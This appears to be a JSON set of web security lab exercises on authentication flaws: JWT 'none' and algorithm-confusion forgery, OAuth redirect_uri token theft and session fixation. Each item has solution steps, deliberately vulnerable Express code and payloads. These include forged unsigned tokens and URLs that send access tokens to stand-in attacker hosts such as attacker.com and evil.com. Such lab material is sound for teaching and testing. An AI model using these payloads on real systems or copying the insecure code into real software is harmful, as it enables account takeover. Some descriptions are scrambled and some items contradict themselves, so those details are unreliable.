[
    {
        "Lab scenario": "JWT algorithm confusion leads to authentication bypass",
      
        "Lab Description": "The application uses JWTs for session management but accepts both RS256 and HS256 algorithms interchangeably. The backend uses RS256 with a public key to validate tokens, but it fails to enforce the algorithm type. The application naively uses the public key as a secret when validating HS256 t a forged JWT to log in as the administrator tokens. To solve: crafuser.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the JWT from a valid session and decode it using jwt.io.",
          "Verify the 'alg' field is set to RS256 and identify that the application uses a public key endpoint for JWT verification.",
          "Craft a malicious JWT with the algorithm set to HS256 and use the public key (downloaded from the /jwks endpoint) as the HMAC secret.",
          "Generate a token with { \"username\": \"admin\" } as the payload and sign it using HS256 with the public key as the secret in jwt.io.",
          "Replace the JWT in your session cookie with the forged token and access /admin to verify success."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.use(require('cookie-parser')()); app.get('/profile', (req, res) => { const token = req.cookies.auth; try { const decoded = jwt.verify(token, publicKey); res.send(`Welcome ${decoded.username}`); } catch (err) { res.status(401).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Confusion Lab running'));",
      
        "payloads": [
          "{ \"alg\": \"HS256\", \"typ\": \"JWT\" }.{ \"username\": \"admin\" }.[HMAC-SHA256 signature using public key]",
          "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0=[forged signature using public key as secret]"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in redirect URI validation allows token theft",
      
        "Lab Description": "This lab simulates a vulnerable OAuth 2.0 implicit grant implementation where the redirect URI is weakly validated using substring matching. An attacker can register a malicious endpoint with a similar domain and capture access tokens. To solve: hijack the victimâ€™s OAuth access token and access their private dashboard.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to inspect the /oauth/authorize flow and observe the redirect_uri parameter.",
          "Register a malicious domain that contains the legitimate redirect URI as a substring (e.g., legit.example.com.attacker.com).",
          "Craft an OAuth authorization request with the manipulated redirect_uri pointing to your domain.",
          "Send the crafted URL to a victim user and capture the fragment containing the access_token on your server.",
          "Use Postman to access /api/dashboard with the stolen access token in the Authorization header to confirm access."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; if (!redirect_uri.includes('https://legit.example.com/callback')) return res.status(400).send('Invalid redirect'); const token = 'access_token=abc123'; res.redirect(`${redirect_uri}#${token}`); }); app.get('/api/dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123') res.send('Sensitive dashboard data'); else res.status(401).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect Lab running'));",
      
        "payloads": [
          "https://legit.example.com.attacker.com/callback#access_token=abc123",
          "https://oauth.example.com/authorize?client_id=xyz&redirect_uri=https://legit.example.com.attacker.com/callback&response_type=token"
        ]
      },
      {
        "Lab scenario": "Session fixation vulnerability in login endpoint",
      
        "Lab Description": "The application assigns a session ID before authentication and fails to regenerate it after login. An attacker can set a session ID for a victim and wait for them to log in. To solve: fixate a session for the victim, log in with it, and access their profile page.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the login flow and observe the session cookie being preserved before and after login.",
          "Send a crafted session ID to the victim via a phishing link or CSRF attack with document.cookie injection.",
          "Wait for the victim to log in while using the pre-assigned session ID.",
          "Use the same session ID in your browser to hijack the session after the victim authenticates.",
          "Access /profile to retrieve the victim's information and verify lab success."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); const sessions = {}; const users = { 'carlos': 's3cr3t' }; app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); app.use((req, res, next) => { if (!req.cookies.session) { const sid = Math.random().toString(36).substr(2); res.cookie('session', sid); sessions[sid] = { authenticated: false, user: null }; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = { authenticated: true, user: username }; res.send('Login successful'); } else { res.status(401).send('Login failed'); } }); app.get('/profile', (req, res) => { const sid = req.cookies.session; const sess = sessions[sid]; if (sess && sess.authenticated) res.send(`Welcome ${sess.user}`); else res.status(403).send('Forbidden'); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
      
        "payloads": [
          "document.cookie='session=attacker123';",
          "POST /login with Cookie: session=attacker123 and valid credentials for victim",
          "Access /profile with Cookie: session=attacker123"
        ]
      },
      {
        "Lab scenario": "JWT signature spoofing via 'none' algorithm in Authorization header",
        "Lab Description": "The application uses JWTs for session management but incorrectly accepts tokens with 'alg':'none'. The vulnerable Express middleware does not verify the JWT signature properly when the 'none' algorithm is provided. The application accepts any token with a valid payload and no signature. To solve: forge a valid token impersonating the user 'carlos' and access their dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "1. Use Burp Suite to intercept the GET /dashboard request and capture the JWT in the Authorization header.",
          "2. Decode the token using jwt.io and examine the algorithm and payload structure.",
          "3. Replace the algorithm in the header with 'none' and modify the payload to { \"username\": \"carlos\" }.",
          "4. Remove the signature part completely and re-encode the token (header.payload).",
          "5. Send a new request to /dashboard with the forged JWT in the Authorization header. Confirm access to Carlos's dashboard."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; const users = { carlos: 'admin', wiener: 'user' }; app.get('/dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); req.user = decoded.username; return res.send(`Welcome to ${req.user}'s dashboard`); } const verified = jwt.verify(token, secret); req.user = verified.username; res.send(`Welcome to ${req.user}'s dashboard`); } catch (err) { res.status(403).send('Invalid token'); } }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
          "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9."
        ]
      },
      {
        "Lab scenario": "OAuth implicit flow misconfiguration leaks token via referrer header",
        "Lab Description": "This OAuth-enabled app uses the implicit flow for authentication, where access tokens are returned in the URL fragment. However, it fails to sanitize or block third-party redirects that leak the access token via the Referer header. To solve: extract the victim's token by abusing an open redirect and access their account using it.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use OWASP ZAP to spider the application and discover an open redirect at /redirect?next=https://attacker.com.",
          "2. Send the OAuth login request and observe that the access token is included in the fragment after redirect_uri.",
          "3. Create a phishing page that includes a link to the vulnerable redirect: /redirect?next=https://attacker.com#access_token=...",
          "4. When the victim clicks the link, the browser sends the full URL (with token fragment) as the Referer.",
          "5. Capture the token from the request to https://attacker.com and use it in the Authorization header to access /my-account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); app.use(express.urlencoded({ extended: true })); const tokens = { 'carlos-token': 'carlos', 'wiener-token': 'wiener' }; app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const user = req.query.user; if (!redirectUri || !user) return res.status(400).send('Invalid request'); const token = user + '-token'; res.redirect(`${redirectUri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (!auth) return res.status(403).send('Missing token'); const user = tokens[auth.split(' ')[1]]; if (!user) return res.status(401).send('Invalid token'); res.send(`Welcome ${user}`); }); app.get('/redirect', (req, res) => { const next = req.query.next; res.redirect(next); }); app.listen(4000);",
        "payloads": [
          "/redirect?next=https://evil.com#access_token=carlos-token",
          "https://vulnerable.com/oauth/callback?user=carlos&redirect_uri=https://evil.com"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login response",
        "Lab Description": "This application assigns a fixed session ID before login and reuses it even after authentication, allowing session fixation. An attacker can send a victim a pre-established session and later hijack it once they log in. To solve: fixate a session ID, have the victim authenticate using it, then access their account using the same ID.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "1. Use Postman to send a GET request to /login and capture the Set-Cookie header. Note the session ID (e.g., session=attacker123).",
          "2. Send a phishing link to the victim that sets the cookie value attacker123 before redirecting to the login page.",
          "3. Once the victim logs in, the session ID remains attacker123 due to improper re-initialization.",
          "4. Use the same session ID (attacker123) in your browser or with curl/Postman and access /my-account.",
          "5. Confirm hijacked access to the victimâ€™s account."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = { carlos: 'pass123' }; app.get('/login', (req, res) => { const sessionId = req.cookies.session || 'attacker123'; res.setHeader('Set-Cookie', `session=${sessionId}; HttpOnly`); res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\" type=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.session; if (users[username] === password) { sessions[sid] = username; res.redirect('/my-account'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.session; if (sessions[sid]) res.send(`Welcome ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(5000);",
        "payloads": [
          "Cookie: session=attacker123",
          "https://vulnerable-app.com/login (with session=attacker123 set beforehand)"
        ]
      },
      {
        "Lab scenario": "JWT token none algorithm bypass in stateless authentication",
        "Lab Description": "The stateless JWT-based authentication mechanism fails to validate the algorithm specified in the JWT header. The application accepts unsigned tokens if the algorithm is set to 'none'. To solve: forge a token to access the admin's account dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to intercept a valid login request and extract the JWT from the Authorization header.",
          "Copy the token and decode it using jwt.io or a Burp extension like JSON Web Tokens.",
          "Modify the payload to impersonate the admin user and change the 'alg' value in the JWT header to 'none'.",
          "Remove the signature section of the JWT, re-encode the token, and replace the original Authorization header with your forged one in Burp Repeater.",
          "Send the request to /admin-dashboard and verify successful access."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const secret = 'supersecretkey'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ user: username, role: 'user' }, secret, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('No token'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload.header.alg === 'none') { const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') return res.send('Admin Dashboard Access Granted'); } try { const verified = jwt.verify(token, secret); if (verified.role === 'admin') return res.send('Admin Dashboard Access Granted'); else return res.status(403).send('Insufficient Role'); } catch (err) { return res.status(401).send('Invalid Token'); } }); app.listen(3001, () => console.log('JWT None Lab running'));",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.",
          "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ."
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login flow",
        "Lab Description": "The login process does not generate a new session identifier after authentication. This allows an attacker to fix a session for a victim before they log in. To solve: log in as Carlos using a session fixation attack.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Burp Suite to access the login page and capture a session cookie before authentication.",
          "Send the session URL to the victim via a reflected XSS or phishing vector (simulated for the lab).",
          "Log in to your own account with a fixed session cookie and observe no change in session ID.",
          "Use the same session ID to log in as Carlos (credentials known or guessed).",
          "Visit /my-account using the fixed session to confirm access to Carlosâ€™s data."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); const users = [{ username: 'carlos', password: 's3cret' }]; app.use(session({ secret: 'keyboardcat', resave: false, saveUninitialized: true })); app.use(express.urlencoded({ extended: true })); app.get('/login', (req, res) => { res.send('<form method=\"POST\"><input name=\"username\"><input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.username = username; return res.redirect('/my-account'); } res.send('Invalid login'); }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') return res.send('Account details for carlos'); res.send('Not authorized'); }); app.listen(3002, () => console.log('Session Fixation Lab running'));",
        "payloads": [
          "GET /login HTTP/1.1\\nCookie: connect.sid=attackersession123",
          "POST /login HTTP/1.1\\nCookie: connect.sid=attackersession123\\nusername=carlos&password=s3cret",
          "GET /my-account HTTP/1.1\\nCookie: connect.sid=attackersession123"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access tokens via redirect URI manipulation",
        "Lab Description": "The application uses an OAuth 2.0 provider to log users in. The 'redirect_uri' parameter is not properly validated, allowing attackers to capture tokens by injecting malicious URLs. To solve: steal Carlosâ€™s access token using an open redirect exploit.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to intercept the OAuth login flow and identify the redirect_uri parameter in the authorization request.",
          "Modify the redirect_uri to an attacker-controlled domain (use https://exploit-server.net/capture).",
          "Send the modified authorization URL to the victim or trigger their login.",
          "Use the Exploit Server to monitor captured GET requests containing the access token in the URL fragment.",
          "Replay the token in a request to /me endpoint to verify you are impersonating Carlos."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = 'access-token-carlos'; const uri = `${redirect_uri}#access_token=${token}&state=${state}`; res.redirect(uri); }); app.get('/me', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer access-token-carlos') return res.send('Welcome Carlos!'); res.status(403).send('Unauthorized'); }); app.listen(3003, () => console.log('OAuth Redirect Lab running'));",
        "payloads": [
          "https://vulnerable-app.com/auth?client_id=abc123&redirect_uri=https://exploit-server.net/capture&state=xyz",
          "GET /me HTTP/1.1\\nAuthorization: Bearer access-token-carlos"
        ]
      },
      {
        "Lab scenario": "JWT token tampering in Authorization header",
        "Lab Description": "The backend uses a stateless JWT-based authentication mechanism, but it fails to validate the token's signature. The application blindly trusts the header and payload claims of the JWT token. To solve: Forge an admin-level token and access the /admin dashboard.",
        "Difficulty Level": "Medium",
        "Solution Steps": [
          "Use Burp Suite to capture a valid JWT from a normal login session and send the request to Repeater.",
          "Analyze the token on https://jwt.io and note that it's signed with 'none' algorithm.",
          "Modify the JWT payload to set {\"role\":\"admin\"} and change the alg field in the header to 'none'. Remove the signature portion.",
          "Replace the original token with the tampered unsigned JWT in the Authorization header.",
          "Send the request to /admin and verify access is granted by confirming 'Admin Dashboard' appears in the response."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username: username, role: 'user' }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token); if (payload.role === 'admin') { return res.send('Admin Dashboard'); } res.status(403).send('Forbidden'); }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyIsInJvbGUiOiJhZG1pbiJ9.",
          "eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
          "eyJhbGciOiJub25lIn0.eyJ1aWQiOiIxIiwicm9sZSI6ImFkbWluIn0."
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration in token exchange",
        "Lab Description": "The application uses OAuth 2.0 to authenticate users via a third-party provider. However, it incorrectly trusts the client-provided access token without verifying it with the OAuth server. To solve: Use a token from your own OAuth account and impersonate Carlos.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use Postman to log in via OAuth using your own account and intercept the /oauth/callback request.",
          "Extract your access token and note the JWT payload structure from the Authorization header.",
          "Modify the token payload using https://jwt.io and change the email or sub field to 'carlos@example.com'. Re-encode the JWT with 'none' as the algorithm.",
          "Submit the modified token in the Authorization header to the /profile endpoint.",
          "Verify that Carlosâ€™s profile data is returned, confirming token trust abuse."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/profile', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded && decoded.email) { return res.send(`User profile: ${decoded.email}`); } res.status(401).send('Invalid token'); }); app.listen(3000);",
        "payloads": [
          "eyJhbGciOiJub25lIn0.eyJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9.",
          "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJlbWFpbCI6ImNhcmxvc0BleGFtcGxlLmNvbSJ9.",
          "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
        ]
      },
      {
        "Lab scenario": "Session fixation via login endpoint",
        "Lab Description": "The application issues session identifiers before authentication and fails to regenerate them upon successful login. An attacker can set a known session ID, trick a victim into using it, and take over their session post-login. To solve: Fix a session ID and hijack Carlos's session after he logs in.",
        "Difficulty Level": "Hard",
        "Solution Steps": [
          "Use OWASP ZAP to proxy your traffic and observe that the server issues a session cookie even before login.",
          "Manually set a crafted session ID in the Cookie header using ZAP and visit the login page.",
          "Trick Carlos into logging in while using the fixed session ID (e.g., via CSRF, phishing, etc.).",
          "After Carlos logs in, use the same session ID to access /my-account.",
          "Confirm that Carlos's account data is returned using the fixed session cookie."
        ],
        "Vulnerability name": "Authentication",
        "srcCode": "const express = require('express'); const session = require('express-session'); const app = express(); app.use(session({ secret: 'abc123', resave: false, saveUninitialized: true })); app.use(require('body-parser').urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'adminpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.user = username; res.send('Logged in'); } else { res.status(403).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (req.session.user) { res.send(`Account: ${req.session.user}`); } else { res.status(401).send('Unauthorized'); } }); app.listen(3000);",
        "payloads": [
          "Cookie: connect.sid=attackersession123",
          "Cookie: connect.sid=knownsessionid456",
          "Cookie: connect.sid=hijackedsession789"
        ]
      },
      {
        "Lab scenario": "OAuth session fixation via predictable redirect URI",
      
        "Lab Description": "The application integrates a third-party OAuth provider for authentication. However, it fails to validate the `state` parameter during the OAuth flow and reuses a fixed session value across users. The application establishes a session cookie before authentication completion. To solve: force Carlos to log in through a manipulated link and hijack his session to access /my-account.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use OWASP ZAP to proxy the OAuth login process and observe that the `state` parameter is missing or not validated.",
          "Capture the OAuth login redirect request and notice a fixed session cookie issued pre-authentication.",
          "Craft a malicious link embedding the session cookie and redirect_uri that points to the victim's login flow.",
          "Send the crafted link to Carlos via social engineering (email simulation link).",
          "Wait for Carlos to authenticate and reuse the fixed session token to access /my-account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/oauth/start', (req, res) => { const sessionId = 'predictable-session'; res.cookie('session', sessionId); res.redirect('https://oauth.provider.com/auth?redirect_uri=http://localhost:4000/oauth/callback'); }); app.get('/oauth/callback', (req, res) => { const { code } = req.query; if (code) { const user = 'carlos'; sessions['predictable-session'] = user; res.redirect('/my-account'); } else { res.send('Missing OAuth code'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) { res.send('Account page for ' + user); } else { res.status(401).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Fixation Lab running on http://localhost:' + PORT));",
      
        "payloads": [
          "https://target.com/oauth/start?redirect_uri=http://target.com/oauth/callback",
          "Set-Cookie: session=predictable-session",
          "http://target.com/oauth/start?session=predictable-session"
        ]
      },
      {
        "Lab scenario": "JWT token tampering via algorithm confusion in token verification logic",
      
        "Lab Description": "The server accepts JWTs for authentication and incorrectly supports multiple algorithms for signature verification. It uses a public RSA key but also accepts `alg=HS256`, allowing attackers to forge tokens by abusing algorithm confusion. To solve: log in as Carlos by crafting a malicious JWT using `HS256` and the server's public key as the HMAC secret.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use Burp Suite to intercept a valid JWT after logging in as a regular user.",
          "Decode the token using jwt.io and note it uses `RS256` with a known public key exposed in `.well-known/jwks.json`.",
          "Change the `alg` header to `HS256`, modify the payload `sub` to `carlos`.",
          "Use the RSA public key as the HMAC secret and sign the token using any JWT library (e.g., jwt.io debugger or PyJWT).",
          "Replay the forged JWT in Authorization: Bearer header and access /my-account."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const pubKey = fs.readFileSync('./public.pem'); app.get('/my-account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(403).send('No token'); const token = auth.split(' ')[1]; try { const decoded = jwt.verify(token, pubKey); if (decoded.sub === 'carlos') return res.send('Welcome Carlos!'); else return res.send('Welcome ' + decoded.sub); } catch (e) { return res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log('JWT Confusion Lab running on http://localhost:' + PORT));",
      
        "payloads": [
          "Header: { \"alg\": \"HS256\", \"typ\": \"JWT\" }",
          "Payload: { \"sub\": \"carlos\" }",
          "HMAC Key: contents of public.pem used as secret"
        ]
      },
      {
        "Lab scenario": "Session ID leakage through verbose error logging",
      
        "Lab Description": "The application logs errors and includes session IDs in stack traces and debug outputs. When a malformed request is sent, the session ID of the logged-in user is exposed via `/logs`. To solve: extract Carlosâ€™s session ID from the logs and reuse it to impersonate him and access his account.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Postman to send malformed JSON requests to `/update-profile` while Carlos is logged in.",
          "Force a server-side exception which includes the session ID in the error stack trace.",
          "Access the `/logs` endpoint and extract the session identifier associated with Carlos.",
          "Set a cookie manually in the browser or via Burp using the stolen session ID.",
          "Visit /my-account to confirm session takeover."
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); const fs = require('fs'); const app = express(); app.use(bodyParser.json()); app.use(cookieParser()); const sessions = { 'sess-abc123': 'carlos' }; app.post('/update-profile', (req, res) => { try { const { name } = req.body; if (!name) throw new Error('Invalid name'); res.send('Updated'); } catch (err) { fs.appendFileSync('logs.txt', `Error for session ${req.cookies.session}: ${err.stack}\\n`); res.status(500).send('Server error'); } }); app.get('/logs', (req, res) => { const logs = fs.readFileSync('logs.txt', 'utf-8'); res.send('<pre>' + logs + '</pre>'); }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user === 'carlos') res.send('Account details for carlos'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('Session Logging Lab running on http://localhost:' + PORT));",
      
        "payloads": [
          "POST /update-profile with invalid JSON to force log entry",
          "GET /logs to leak 'sess-abc123'",
          "Set-Cookie: session=sess-abc123"
        ]
      },
      {
        "Lab scenario": "Session fixation via predictable session ID in login endpoint",
      
        "Lab Description": "This application's session management logic does not regenerate session tokens upon login, allowing session fixation attacks. The application accepts session tokens passed in cookies and maintains them post-authentication without validation. To solve: Hijack Carlos's session using a pre-set session ID.",
      
        "Difficulty Level": "Medium",
      
        "Solution Steps": [
          "Use OWASP ZAP to spider the application and locate all endpoints related to session handling.",
          "Use Burp Suite to intercept the login process and observe that the session ID remains the same before and after successful login.",
          "Craft a login URL that sets a known session ID using: GET /login?fixsession=abc123",
          "Send the crafted session ID to Carlos via social engineering (simulated by manual cookie setup in lab)",
          "Once Carlos logs in using the fixed session ID, reuse the same ID to access /my-account as Carlos"
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'welcome123' }]; const sessions = {}; app.get('/login', (req, res) => { const { fixsession } = req.query; if (fixsession) { res.cookie('session_id', fixsession); res.send('Session set'); return; } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const session = req.cookies.session_id || Math.random().toString(36).substring(2); sessions[session] = username; res.cookie('session_id', session); res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.session_id]; if (username === 'carlos') { res.send('Account details for carlos'); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
      
        "payloads": [
          "GET /login?fixsession=fixme123",
          "Cookie: session_id=fixme123",
          "POST /login with carlos credentials while fixsession=fixme123",
          "Reuse Cookie: session_id=fixme123 to GET /my-account"
        ]
      },
      {
        "Lab scenario": "JWT signature bypass via algorithm confusion",
      
        "Lab Description": "This application's JWT implementation accepts tokens signed using either HMAC or RSA, but fails to enforce algorithm restrictions securely. The application uses an insecure library that trusts the alg header from the user. To solve: Forge a valid JWT with alg=none to access Carlos's admin page.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Postman to retrieve a valid JWT token from /login for your own account and inspect its header and payload.",
          "Decode the JWT using jwt.io and note that the algorithm used is RS256.",
          "Manually modify the header to {\"alg\":\"none\"} and set the payload to {\"username\":\"carlos\",\"role\":\"admin\"}.",
          "Use Burp Suite to replace the Authorization: Bearer token with your crafted JWT and send request to /admin-dashboard",
          "Confirm the bypass worked by observing Carlos's dashboard"
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const PRIVATE_KEY = require('fs').readFileSync('private.key'); const users = [{ username: 'carlos', password: 'jwtpass', role: 'admin' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Invalid credentials'); const token = jwt.sign({ username: user.username, role: user.role }, PRIVATE_KEY, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/admin-dashboard', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(403).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, PRIVATE_KEY, { algorithms: ['RS256', 'HS256'] }); if (decoded.role === 'admin') { res.send('Welcome to Carlosâ€™s Admin Dashboard'); } else { res.status(403).send('Forbidden'); } } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Algorithm Confusion Lab running at http://localhost:${PORT}`));",
      
        "payloads": [
          "Header: {\"alg\":\"none\"}",
          "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
          "JWT: base64url(header) + '.' + base64url(payload) + '.'",
          "Authorization: Bearer <forged_jwt>",
          "GET /admin-dashboard with forged JWT"
        ]
      },
      {
        "Lab scenario": "OAuth misconfiguration leaking access token via redirect",
      
        "Lab Description": "This application uses OAuth 2.0 for login but does not validate the redirect_uri properly, allowing attackers to leak access tokens to external sites. The application supports login via third-party OAuth providers and accepts dynamic redirect URIs. To solve: Leak Carlos's OAuth token to your controlled server.",
      
        "Difficulty Level": "Hard",
      
        "Solution Steps": [
          "Use Burp Suite to intercept the OAuth flow after initiating login via 'Login with OAuth'.",
          "Observe that the redirect_uri parameter is not restricted to a specific domain or exact match.",
          "Change the redirect_uri to a domain under your control (e.g. attacker.com/steal).",
          "Send a phishing link to Carlos (simulated by manual navigation) with modified redirect_uri to leak the access token.",
          "Monitor your server logs for the leaked access token, then use it to call /oauth/userinfo as Carlos"
        ],
      
        "Vulnerability name": "Authentication",
      
        "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const users = [{ username: 'carlos', oauthToken: 'token123' }]; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, state } = req.query; const token = 'token123'; const uri = `${redirect_uri}?access_token=${token}&state=${state}`; res.redirect(uri); }); app.get('/oauth/userinfo', (req, res) => { const token = req.query.access_token; if (token === 'token123') { res.send('Carlos Account Info'); } else { res.status(403).send('Invalid token'); } }); const PORT = 5000; app.listen(PORT, () => console.log(`OAuth Redirect Leak Lab running on http://localhost:${PORT}`));",
      
        "payloads": [
          "GET /oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/steal&state=xyz",
          "Leak URL: https://lab-site/oauth/authorize?...",
          "Intercepted access_token=token123",
          "GET /oauth/userinfo?access_token=token123"
        ]
      },
      {
        "Lab scenario": "JWT signature verification bypass in API Gateway",
        "Lab Description": "The application uses JWTs for API authentication but improperly trusts the `alg` field without enforcing the expected signing algorithm. The application accepts tokens signed with 'none'. To solve: Forge a JWT to impersonate the admin user and access the admin dashboard endpoint.",
